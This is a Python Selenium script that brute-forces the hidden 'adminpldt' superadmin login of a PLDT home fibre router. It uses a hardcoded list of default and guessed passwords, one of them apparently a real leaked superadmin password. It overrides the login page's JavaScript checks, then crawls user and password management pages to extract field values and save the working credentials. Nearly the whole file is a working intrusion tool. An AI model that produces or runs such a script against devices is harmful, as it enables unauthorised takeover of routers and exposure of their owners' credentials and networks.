#!/usr/bin/env python3
"""
Login via PLDT superadmin (adminpldt) on /admin.html
Then navigate to find/change the admin password.
"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
import os, time, json

ROUTER = "https://192.168.1.1"

# Known PLDT superadmin credentials
SUPERADMIN_CREDS = [
    ("adminpldt", "z6dtnxg3ocz4"),
    ("adminpldt", "adminpldt"),
    ("adminpldt", "1234567890"),
    ("adminpldt", "PLDT12345678"),
    ("adminpldt", "pldt12345678"),
    ("adminpldt", "PLDThomefibr@123"),
    ("adminpldt", "pldthomefibr@123"),
    ("adminpldt", "PLDThomeFibr@2023"),
    ("adminpldt", "PLDT@fibr"),
    ("adminpldt", "pldt@fibr"),
    ("adminpldt", "Fibr@1234"),
    ("adminpldt", "fibr@1234"),
    ("adminpldt", "PLDTHomeFibr"),
    ("adminpldt", "PLDThomefibr"),
    ("adminpldt", "pldthomefibr"),
    ("adminpldt", "password123"),
    ("adminpldt", "PLDTp1234"),
    ("adminpldt", "p1234"),
]

# Pages to check after login — user/password management
PASSWORD_PAGES = [
    "/html/ssmp/management/account.asp",
    "/html/amp/system/Password.asp",
    "/html/ssmp/system/user.asp",
    "/html/amp/system/UserConfig.asp",
    "/html/ssmp/system/userconfig.asp",
    "/admin.html",
    "/html/amp/advanced/UserMgmt.asp",
    "/html/ssmp/management/user.asp",
    "/html/amp/wireless/WlanBasic.asp",
]


def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver


def try_adminpldt(driver, username, password):
    """Try logging in via /admin.html (superadmin page)."""
    print(f"\n  Trying {username}:{password} on /admin.html ...")

    try:
        driver.get(f"{ROUTER}/admin.html")
        time.sleep(3)
    except:
        try:
            driver.get(f"{ROUTER}/")
            time.sleep(2)
            driver.execute_script("window.location='/admin.html';")
            time.sleep(3)
        except Exception as e:
            print(f"    Failed to load: {e}")
            return False

    url = driver.current_url
    print(f"    Current URL: {url}")

    # Check if we're already logged in or need to login
    try:
        page = driver.page_source
    except:
        page = ""

    # Look for login form
    has_login = "txt_Username" in page or "txtUserName" in page or "username" in page.lower()

    if has_login:
        print("    Found login form, entering credentials...")

        # Try different username field IDs
        user_ids = ["txt_Username", "txtUserName", "username", "UserName"]
        pass_ids = ["txt_Password", "txtPassword", "password", "PassWord"]

        user_field = None
        pass_field = None

        for uid in user_ids:
            try:
                user_field = driver.find_element(By.ID, uid)
                break
            except:
                pass

        for pid in pass_ids:
            try:
                pass_field = driver.find_element(By.ID, pid)
                break
            except:
                pass

        if not user_field or not pass_field:
            # Try by name or CSS selector
            try:
                user_field = user_field or driver.find_element(By.CSS_SELECTOR, "input[type='text']")
                pass_field = pass_field or driver.find_element(By.CSS_SELECTOR, "input[type='password']")
            except:
                print("    Cannot find login fields")
                return False

        # Clear and type
        driver.execute_script("arguments[0].value='';", user_field)
        driver.execute_script("arguments[0].value='';", pass_field)
        user_field.clear()
        user_field.send_keys(username)
        pass_field.clear()
        pass_field.send_keys(password)

        # Override JS checks if needed
        driver.execute_script("""
            window.CheckPassword = function() { return 0; };
            window.setDisable = function() {};
            window.Userlevel = 0;
            window.preflag = 0;
        """)

        # Find and click submit button
        btn_ids = ["button", "btnLogin", "loginBtn", "submit", "login_button"]
        clicked = False
        for bid in btn_ids:
            try:
                btn = driver.find_element(By.ID, bid)
                driver.execute_script("arguments[0].style.display='';", btn)
                btn.click()
                clicked = True
                print(f"    Clicked button #{bid}")
                break
            except:
                pass

        if not clicked:
            try:
                btn = driver.find_element(By.CSS_SELECTOR, "button, input[type='submit'], input[type='button']")
                btn.click()
                clicked = True
                print("    Clicked submit button via CSS")
            except:
                print("    Cannot find submit button")

        time.sleep(4)

    # Check result
    url_after = driver.current_url
    page_after = driver.page_source
    print(f"    URL after login: {url_after}")

    if "admin" in url_after.lower() or "txt_Username" not in page_after:
        print(f"    *** LOGIN SUCCESSFUL! ***")
        return True

    if "loginfail" in page_after.lower() or "Incorrect" in page_after:
        print(f"    Login failed (wrong credentials)")
        return False

    # Check if there's useful content
    if len(page_after) > 2000 and "login" not in url_after.lower():
        print(f"    Might be logged in (page size: {len(page_after)})")
        return True

    print(f"    Unclear result (page size: {len(page_after)})")
    return False


def explore_after_login(driver):
    """Navigate to password/user management pages after successful login."""
    print(f"\n{'='*60}")
    print("  Logged in! Exploring password/user management pages...")
    print(f"{'='*60}\n")

    # First check what's on the current admin page
    try:
        page = driver.page_source
        # Find all links on the page
        links = driver.execute_script("""
            var links = [];
            var anchors = document.querySelectorAll('a');
            for (var i = 0; i < anchors.length; i++) {
                links.push({href: anchors[i].href, text: anchors[i].textContent.trim()});
            }
            var iframes = document.querySelectorAll('iframe');
            for (var i = 0; i < iframes.length; i++) {
                links.push({href: iframes[i].src, text: 'iframe: ' + iframes[i].id});
            }
            return links;
        """)
        print(f"  Links on current page:")
        for link in links:
            print(f"    {link['text'][:50]:50s} -> {link['href']}")
    except Exception as e:
        print(f"  Error reading page: {e}")

    print()

    # Try each password/user management page
    found_data = []
    for page_path in PASSWORD_PAGES:
        try:
            driver.get(f"{ROUTER}{page_path}")
            time.sleep(3)
            url = driver.current_url
            source = driver.page_source

            if "login.asp" in url or "txt_Username" in source:
                print(f"  {page_path:50s} -> REDIRECT TO LOGIN")
                continue

            size = len(source)
            # Look for password-related content
            has_password = any(w in source.lower() for w in [
                "password", "passwd", "pass", "credential",
                "user", "account", "admin"
            ])

            print(f"  {page_path:50s} -> {url[-40:]:40s} ({size} chars)")

            if has_password and size > 1000:
                print(f"    *** Contains password/user content! ***")
                found_data.append((page_path, source))

                # Try to extract visible text
                text = driver.execute_script("""
                    var elements = document.querySelectorAll('input, select, label, span, td, div');
                    var texts = [];
                    for (var i = 0; i < elements.length; i++) {
                        var el = elements[i];
                        var t = el.textContent.trim();
                        var v = el.value || '';
                        var id = el.id || '';
                        var name = el.name || '';
                        var type = el.type || '';
                        if (t || v || id) {
                            texts.push(id + ' | ' + name + ' | ' + type + ' | ' + t.substring(0, 100) + ' | val=' + v);
                        }
                    }
                    return texts.join('\\n');
                """)
                print(f"    Page elements:")
                for line in text.split('\n')[:30]:
                    if line.strip():
                        print(f"      {line.strip()}")

        except Exception as e:
            print(f"  {page_path:50s} -> ERROR: {str(e)[:60]}")

    return found_data


def main():
    print(f"\n{'='*60}")
    print("  PLDT Superadmin (adminpldt) Login & Password Extract")
    print(f"  Target: {ROUTER}/admin.html")
    print(f"{'='*60}\n")

    driver = setup_driver()

    try:
        # Try each credential pair
        for username, password in SUPERADMIN_CREDS:
            success = try_adminpldt(driver, username, password)
            if success:
                print(f"\n  *** SUPERADMIN ACCESS: {username}:{password} ***\n")
                data = explore_after_login(driver)

                # Save results
                result = {
                    "superadmin_user": username,
                    "superadmin_pass": password,
                    "pages_found": [{"path": p, "size": len(s)} for p, s in data],
                }
                with open("superadmin_result.json", "w") as f:
                    json.dump(result, f, indent=2)
                print(f"\n  Results saved to superadmin_result.json")
                return

        print(f"\n  All superadmin credentials failed.")
        print(f"  The superadmin account may have been disabled or credentials changed.")

    finally:
        driver.quit()


if __name__ == "__main__":
    main()
